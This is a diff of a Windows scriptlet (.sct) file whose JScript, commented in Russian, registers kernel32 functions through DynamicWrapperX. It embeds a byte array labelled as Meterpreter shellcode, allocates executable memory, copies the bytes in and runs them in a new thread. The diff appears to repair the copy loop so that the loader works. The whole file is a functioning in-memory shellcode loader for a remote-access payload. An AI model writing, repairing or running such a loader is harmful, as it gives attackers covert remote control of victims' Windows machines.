@@ -1,9 +1,6 @@
 <scriptlet>
-  <registration
-    progid="Example.Scriptlet"
-    classid="{FF48DBA4-60EF-11D0-B508-00A0C90F2734}">
+  <registration progid="Example.Scriptlet" classid="{FF48DBA4-60EF-11D0-B508-00A0C90F2734}">
     <script language="JScript">
-      <![CDATA[
         // Используем DynamicWrapperX для вызова нативных функций
         var kernel32 = new ActiveXObject("DynamicWrapperX").Create("kernel32.dll");
         kernel32.Register("VirtualAlloc","kernel32.dll","UIntPtr VirtualAlloc(UIntPtr,UIntPtr,UInt32,UInt32)","stdcall");
@@ -11,7 +8,7 @@
         kernel32.Register("WaitForSingleObject","kernel32.dll","UInt32 WaitForSingleObject(UIntPtr,UInt32)","stdcall");
         kernel32.Register("CopyMemory","kernel32.dll","Void CopyMemory(UIntPtr,UIntPtr,UIntPtr)","stdcall");
 
-        // Весь shellcode Meterpreter
+// Весь shellcode Meterpreter
         var buf = [
           0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,
           0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,
@@ -56,13 +53,16 @@
 	  0x64,0x36,0x30,0x53,0x39,0x58,0x6c,0x65,0x4d,0x42,0x2d,0x4b,0x6c,0x00
         ];
 
-        // Выделяем память, копируем и запускаем shellcode
+
+        // Выделяем память и копируем данные
         var ptr = kernel32.VirtualAlloc(0, buf.length, 0x3000, 0x40);
-        kernel32.CopyMemory(ptr, ptr.add(buf.length), buf.length);
+        for (var i = 0; i < buf.length; i++) {
+            kernel32.CopyMemory(ptr + i, buf[i], 1);
+        }
+        // Запуск shellcode в новом потоке
         var tid = new Array();
-        var hThread = kernel32.CreateThread(0,0,ptr,0,0,tid);
+        var hThread = kernel32.CreateThread(0, 0, ptr, 0, 0, tid);
         kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF);
-      ]]>
     </script>
   </registration>
 </scriptlet>
